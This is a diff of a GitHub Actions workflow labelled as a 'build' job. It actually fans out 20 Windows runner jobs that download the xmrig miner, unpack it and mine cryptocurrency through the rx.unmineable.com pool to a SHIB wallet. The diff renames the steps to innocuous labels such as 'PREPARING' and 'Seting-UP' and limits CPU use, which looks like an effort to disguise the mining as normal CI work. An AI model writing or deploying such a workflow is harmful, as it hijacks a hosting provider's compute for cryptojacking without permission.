@@ -1,10 +1,10 @@
-name: NAME
-
+name: eX-code_UMBL
+ 
 on: [workflow_dispatch]
-
+ 
 jobs:
   build:
-    name: NAME
+    name: eX-code_UMBL
     runs-on: windows-latest
     strategy:
       max-parallel: 5
@@ -16,12 +16,11 @@ jobs:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
     steps:
-    - name: DOWNLOAD
+    - name: PREPARING
       run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-msvc-win64.zip -OutFile xmrig-6.16.2-msvc-win64.zip
-    - name: Extract
+    - name: Seting-UP
       run: Expand-Archive xmrig-6.16.2-msvc-win64.zip
-    - name: RUNNING
-      run: .\C:\mine\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xb4d7fa729733a59552d0ee356a878d81ac5b8cb2.SHIBA666 -p x -t 1
+    - name: Running
+      run: .\mine\xmrig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u SHIB:SHIB_WALLET.WORKER_NAME
     - name: DONE
       run: exit
-	  
